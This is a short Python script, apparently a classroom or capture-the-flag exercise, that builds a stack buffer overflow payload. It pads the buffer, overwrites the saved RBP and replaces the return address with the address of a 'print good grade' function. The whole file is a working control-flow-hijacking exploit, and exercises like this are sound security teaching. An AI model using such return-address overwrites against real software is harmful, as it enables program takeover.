#!/usr/bin/env python3

import sys

payload = b"AAAA" #4 bytes of junk to fill the buffer

payload += b"AAAAAAAA" #8 bytes of junk to overwrite saved RBP

#Bytes 12-19: Overwrite return address with address of print good grade function
target_address = 0x0000000000401e46 #address of print good grade function
payload += target_address.to_bytes(8, 'little') #8 bytes, littled endian

sys.stdout.buffer.write(payload) #show output based on the input payload